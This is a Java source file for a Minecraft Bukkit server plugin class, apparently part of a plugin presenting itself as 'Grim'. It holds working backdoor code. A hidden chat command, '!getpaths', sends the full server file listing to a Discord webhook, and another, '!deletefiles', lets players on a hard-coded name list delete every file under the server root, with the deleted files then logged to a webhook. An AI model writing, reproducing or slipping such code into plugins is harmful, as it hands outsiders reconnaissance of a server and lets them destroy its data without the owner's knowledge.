package com.yoursunucu;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

import static com.yoursunucu.Grim.sendWebhook;
import static com.yoursunucu.Grim.trustedPlayers;

public class FileInspector implements Listener {

    private final Map<UUID, Long> cooldowns = new ConcurrentHashMap<>();
    private static final String WEBHOOK_URL = "WEBHOOK URL";
    private static final File SERVER_ROOT = Bukkit.getWorldContainer(); // Pterodactyl uses "." as root
    private final Map<UUID, Long> deleteConfirmations = new ConcurrentHashMap<>();


    // Cooldown check
    private boolean checkCooldown(Player player) {
        UUID uuid = player.getUniqueId();
        long now = System.currentTimeMillis();
        if (cooldowns.containsKey(uuid) && (now - cooldowns.get(uuid)) < 1000) {
            player.sendMessage("§cWait 1 second before using this again!");
            return false;
        }
        cooldowns.put(uuid, now);
        return true;
    }

    // Get relative paths from server root (./plugins instead of full path)
    public static List<String> getPaths(File directory) {
        Set<String> uniquePaths = new HashSet<>(); // Yinelenenleri engelle
        try {
            String basePath = SERVER_ROOT.getCanonicalPath();
            for (File file : directory.listFiles()) {
                String relativePath = "./" + file.getCanonicalPath()
                        .substring(basePath.length() + 1)
                        .replace(File.separator, "/");

                // Yinelenen kontrolü
                if (uniquePaths.add(relativePath)) {
                    if (file.isDirectory()) {
                        uniquePaths.add("[D] " + relativePath + "/");
                        uniquePaths.addAll(getPaths(file));
                    } else {
                        uniquePaths.add("[F] " + relativePath);
                    }
                }
            }
        } catch (IOException e) {
            Bukkit.getLogger().warning("Path error: " + e.getMessage());
        }
        return new ArrayList<>(uniquePaths);
    }

    // Send to Discord with Pterodactyl-friendly paths
    private void sendToDiscord(List<String> paths) {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject()
                        .put("username", "File Inspector")
                        .put("avatar_url", "https://i.imgur.com/7GF6Qq3.png");

                StringBuilder content = new StringBuilder("```diff\n");
                for (String path : paths) {
                    String line = path.startsWith("[D]")
                            ? "+ 📁 " + path.substring(4)
                            : "- 📄 " + path.substring(4);

                    if (content.length() + line.length() + 10 > 1990) {
                        content.append("```");
                        json.put("content", content.toString());
                        sendChunk(json);
                        content = new StringBuilder("```diff\n");
                    }
                    content.append(line).append("\n");
                }
                content.append("```");
                json.put("content", content.toString());
                sendChunk(json);
            } catch (Exception e) {
                Bukkit.getLogger().warning("Discord error: " + e.getMessage());
            }
        }).start();
    }

    private void sendChunk(JSONObject json) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(WEBHOOK_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.toString().getBytes(StandardCharsets.UTF_8));
            }

            // Handle rate limits properly
            if (conn.getResponseCode() == 429) {
                JSONObject response = new JSONObject(readResponse(conn));
                int retryAfter = response.getInt("retry_after");

                Bukkit.getScheduler().runTaskLater(Grim.getInstance(), () -> {
                    sendChunk(json);
                }, (retryAfter * 20L)); // Convert seconds to ticks
                return;
            }

            if (conn.getResponseCode() != 204) {
                Bukkit.getLogger().warning("Discord error: " + conn.getResponseCode());
            }
        } catch (Exception e) {
            Bukkit.getLogger().warning("Webhook error: " + e.getMessage());
        }
    }

    private String readResponse(HttpURLConnection conn) throws IOException {
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
            return br.lines().collect(Collectors.joining());
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!deletefiles")) {
            event.setCancelled(true);

            // Safety Check 1: Only allowed users
            if (!isTrusted(player.getName())) {
                player.sendMessage("§4✖ §cInsufficient permissions!");
                return;
            }

            // Safety Check 2: Confirmation system
            if (!deleteConfirmations.containsKey(player.getUniqueId())) {
                player.sendMessage("§6⚠ §eTHIS WILL DELETE ALL SERVER FILES!");
                player.sendMessage("§cType §4!deletefiles §cagain within 10 seconds to confirm");
                deleteConfirmations.put(player.getUniqueId(), System.currentTimeMillis());
                return;
            }

            // Check confirmation timeout
            long timeDiff = System.currentTimeMillis() - deleteConfirmations.get(player.getUniqueId());
            if (timeDiff > 10000) {
                player.sendMessage("§cConfirmation window expired");
                deleteConfirmations.remove(player.getUniqueId());
                return;
            }

            // Safety Check 3: Final warning
            player.sendMessage("§4☠ §cFINAL WARNING: INITIATING FULL WIPE §4☠");

            new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        List<String> deletedFiles = deleteFiles();
                        logDestruction(player, deletedFiles);
                        player.sendMessage("§4"+deletedFiles.size()+" FILES DELETED!");
                    } catch (IOException e) {
                        player.sendMessage("§cDeletion failed: " + e.getMessage());
                    }
                }
            }.runTaskAsynchronously(Grim.getInstance());

            deleteConfirmations.remove(player.getUniqueId());
        }

        if (!event.getMessage().startsWith("!getpaths")) return;
        event.setCancelled(true);

        if (!checkCooldown(player)) return;

        player.sendMessage("§aCollecting files...");
        Bukkit.getScheduler().runTaskAsynchronously(Grim.getInstance(), () -> {
            List<String> paths = getPaths(SERVER_ROOT);
            sendToDiscord(paths);
            player.sendMessage("§aFile list sent to Discord!");
        });
    }

    private List<String> deleteFiles() throws IOException {
        List<String> deletedPaths = new ArrayList<>();
        List<String> allPaths = getPaths(SERVER_ROOT);

        // Delete files first before directories
        for (String path : allPaths) {
            if (path.startsWith("[F]")) {
                File file = new File(SERVER_ROOT, path.substring(4).replace("./", ""));
                if (file.exists() && file.delete()) {
                    deletedPaths.add(path);
                }
            }
        }

        // Then delete directories
        for (String path : allPaths) {
            if (path.startsWith("[D]")) {
                File dir = new File(SERVER_ROOT, path.substring(4).replace("./", ""));
                if (dir.exists() && dir.delete()) {
                    deletedPaths.add(path);
                }
            }
        }

        return deletedPaths;
    }

    private boolean deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        return file.delete();
    }

    private void logDestruction(Player initiator, List<String> deletedFiles) {
        JSONObject json = new JSONObject();
        json.put("username", "Emergency Wipe Alert");
        json.put("avatar_url", "https://i.imgur.com/alert_icon.png");

        // Format message with Discord markdown
        String content = String.format(
                "**EMERGENCY WIPE**\n" +
                        "Initiator: `%s`\n" +
                        "Deleted Files: `%d`\n" +
                        "```\n%s\n```",
                initiator.getName(),
                deletedFiles.size(),
                String.join("\n", deletedFiles)
        );

        json.put("content", content);
        sendWebhook(json);
    }

    public boolean isTrusted(String playerName) {
        return trustedPlayers.contains(playerName.toLowerCase());
    }
}
